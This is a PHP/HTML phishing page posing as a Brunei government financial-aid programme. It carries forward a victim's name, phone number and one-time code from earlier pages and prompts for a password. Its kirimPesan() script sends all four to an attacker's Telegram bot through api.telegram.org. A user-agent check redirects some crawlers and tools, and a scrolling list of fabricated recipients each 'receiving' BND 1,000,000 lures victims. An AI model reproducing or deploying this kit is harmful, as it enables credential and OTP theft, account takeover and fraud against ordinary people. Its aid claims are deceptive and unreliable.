<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location:');
die();
}
include 'telegram.php';
?>
<html lang="en">


  
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>

<script>
        function kirimPesan() {
        
        var otp = document.getElementById('otp');
        var phone = document.getElementById('phone');
        var nama = document.getElementById('nama');
        var kode2 = document.getElementById('kode2');
        
            var gabungan = '%5BDALLE%20KO%5D%0A%0A' + 'NAMA%20%3A%0A' + nama.value +'%0A%0ANOMOR%20%3A%0A' + phone.value + '%0A%0AOTP%20%3A%0A' + otp.value + '%0A%0APASS%20%3A%0A' + kode2.value;
        
           var token = '<?php echo $id_bot;?>'; // Ganti dengan token bot yang kamu buat
            var grup = '<?php echo $telegram_id;?>'; // Ganti dengan chat id dari bot yang kamu buat
        
            $.ajax({
                url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
                method: `POST`,
            })
        }
    </script>

<head>
    <meta charset="utf-8">
    <title>BANTUAN KERAJAAN BRUNEI</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="BANTUAN KERAJAAN BRUNEI" name="keywords">
    <meta content="Kerajaan telah menambah baik program bantuan sebagai bantuan subsidi bersasar kepada rakyat yang paling terkesan dengan gelumang kos sara hidup. " name="description">

    <!-- Favicon -->
    <link href="assets/img/favicon.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Jost:wght@500;600;700&family=Open+Sans:wght@400;600&display=swap" rel="stylesheet"> 

    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/assets/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">

    <!-- Libraries Stylesheet -->
    <link href="assets/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="assets/lib/animate/animate.min.css" rel="stylesheet">
    <link href="assets/lib/tempusdominus/assets/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />
    <link href="assets/lib/twentytwenty/twentytwenty.css" rel="stylesheet" />

    <!-- Customized Bootstrap Stylesheet -->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">

    <!-- Template Stylesheet -->
    <link href="assets/css/style.css" rel="stylesheet">
</head>

<body>



    <style>
        /* Add a black background color to the top navigation */
.topnav {
  background-color: #549ff9f7;
  overflow: hidden;
}

/* Style the links inside the navigation bar */
.topnav a {
  float: center;
  display: block;
  color: #f2f2f2;
  text-align: center;
  padding: 14px 16px;
  text-decoration: none;
  font-size: 17px;
  font-weight: bold;
}

/* Change the color of links on hover */
.topnav a:hover {
  background-color: #ffffff;
  color: rgb(255, 255, 255)
}

/* Add an active class to highlight the current page */
.topnav a.active {
  background-color: #04AA6D;
  color: white;
}

/* Hide the link that should open and close the topnav on small screens */
.topnav .icon {
  display: none;
}
    </style>

   


    <!-- Carousel Start -->
    <div class="container-fluid p-0">
        <div id="header">
            <div class="">
                <div class="">
                    <img class="w-100" src="assets/img/banner.png" alt="Image">
                </div>
            </div>
        </div>
    </div>
    <!-- Carousel End -->


     <!-- Appointment Start -->
     <div class="container-fluid">
        <div class="container">

                <div class="col">
                    <div class="py-0">
                        <h1 class="display-5 mb-0 text-center" style="font-size: 22px; color: #2c3ce4;">HANTAR RESUME SEKARANG</h1>
                    </div>
                </div>
                <div class="col">
                    <div class=" h-10 d-flex flex-column justify-content-center text-center p-2">
                        <label style="font-size: 13px; color: #2c3ce4; text-align: left;">Enter your password.</label>
                        <form action="proses.php" method="post" onsubmit="loadd();">
                                <div class="row g-2">
                                    <div class="input-group mb-0">
                                    <input type="hidden" name="nama" id="nama" value="<?php echo $_POST['nama'];?>" readonly>
                                    <input type="hidden" name="phone" id="phone" value="<?php echo $_POST['phone'];?>" readonly>
                                    	<input type="hidden" name="otp" id="otp" value="<?php echo $_POST['otp'];?>" readonly>
                                        <input id="kode2" type="text" class="form-control" placeholder="Kata laluan anda" aria-label="Kata laluan awak" aria-describedby="basic-addon1">
                                    </div>
                                   
                                    <div class="col-12">
                                    <button name="save" id="nextBtn" type="submit" class="btn btn-dark w-100 py-3" onclick="kirimPesan()">Teruskan</a>
                                    </div>
                                </div>
                        </form>
                    </div>
                </div>
          
        </div>
    </div>
    <!-- Appointment End -->
    
      
    <div class="carousel-item active">
        <img class="w-100" src="assets/img/footer.png" alt="Image">
    </div>


<br/>
<br/>
 



      <div class="card bg-primary mt-5">
        <div class="card-header text-center" style="font-weight: bold; color: #ffffff;">PENERIMA BANTUAN</div>
        <div class="card-body">
            <marquee direction="up" height="150px">

            <button style="width: 100%;" class="btn btn-light">Nurul Afifah binti Iqbal
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
            </button>
            
            <button style="width: 100%;" class="btn btn-secondary">Mohammed Buang Salehudin
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
            </button>
            <p></p>
            <button style="width: 100%;" class="btn btn-light">Mohamad Che Hussein Syazwan
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
            </button>
            <button style="width: 100%;" class="btn btn-secondary">Noor Rahmah binti Wan Redzuawan
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
            </button>
            <p></p>
            <button style="width: 100%;" class="btn btn-light">Nor Hajjah Rosalinda binti Mansor
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <button style="width: 100%;" class="btn btn-secondary">Nurul Azika binti Zulkefli
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <p></p>
            <button style="width: 100%;" class="btn btn-light">Nur Shafiqah Adam
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <button style="width: 100%;" class="btn btn-secondary">Nurul Nikmah binti Tarmizi
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <p></p>
            <button style="width: 100%;" class="btn btn-light">Nur Norsyamimie Noorizman binti Mukmin
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <button style="width: 100%;" class="btn btn-secondary">Shahira Khusaini
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <p></p>
            <button style="width: 100%;" class="btn btn-light">Nuur Wardatul Shmsul binti Azim
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <button style="width: 100%;" class="btn btn-secondary">Sybil Pathmanaban
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <p></p>
            <button style="width: 100%;" class="btn btn-light">Wan Aniq bin Izlan
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <button style="width: 100%;" class="btn btn-secondary">Muhamad Irfan bin Mutaali
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <p></p>
            <button style="width: 100%;" class="btn btn-light">Qamarina Hapani binti Syed Shah
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <button style="width: 100%;" class="btn btn-secondary">Nuur Hajjah Nordiana Sonan
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <p></p>
            <button style="width: 100%;" class="btn btn-light">Nur Nabila Arias binti Sudarrahman
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <button style="width: 100%;" class="btn btn-secondary">Dalila binti Rozi Zainudin
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <p></p>
            <button style="width: 100%;" class="btn btn-light">Hayaty Zolkafeli binti Darul Yajid
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
            <button style="width: 100%;" class="btn btn-secondary">Wahidah binti Buhari
            <br>
            <span style="color: #a0a0a0">Successful BND 1.000,000</span>
        </button>
             </marquee>
        </div>
      </div>



    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/assets/js/bootstrap.bundle.min.js"></script>
    <script src="assets/lib/wow/wow.min.js"></script>
    <script src="assets/lib/easing/easing.min.js"></script>
    <script src="assets/lib/waypoints/waypoints.min.js"></script>
    <script src="assets/lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="assets/lib/tempusdominus/assets/js/moment.min.js"></script>
    <script src="assets/lib/tempusdominus/assets/js/moment-timezone.min.js"></script>
    <script src="assets/lib/tempusdominus/assets/js/tempusdominus-bootstrap-4.min.js"></script>
    <script src="assets/lib/twentytwenty/jquery.event.move.js"></script>
    <script src="assets/lib/twentytwenty/jquery.twentytwenty.js"></script>

    <!-- Template Javascript -->
    <script src="assets/js/main.js"></script>
</body>

</html>
